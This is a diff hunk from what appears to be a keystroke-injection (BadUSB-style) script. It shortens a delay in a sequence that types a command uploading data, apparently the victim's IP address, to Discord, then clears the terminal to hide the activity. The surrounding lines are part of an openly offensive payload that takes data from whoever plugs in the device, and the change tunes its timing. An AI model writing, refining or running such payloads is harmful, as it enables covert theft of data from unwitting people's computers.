@@ -73,6 +73,6 @@ ENTER
 DELAY 1000
 STRING Upload-Discord -text "(Discord IP By Sev)"
 ENTER
-DELAY 2500
+DELAY 1000
 STRING Clear
 ENTER
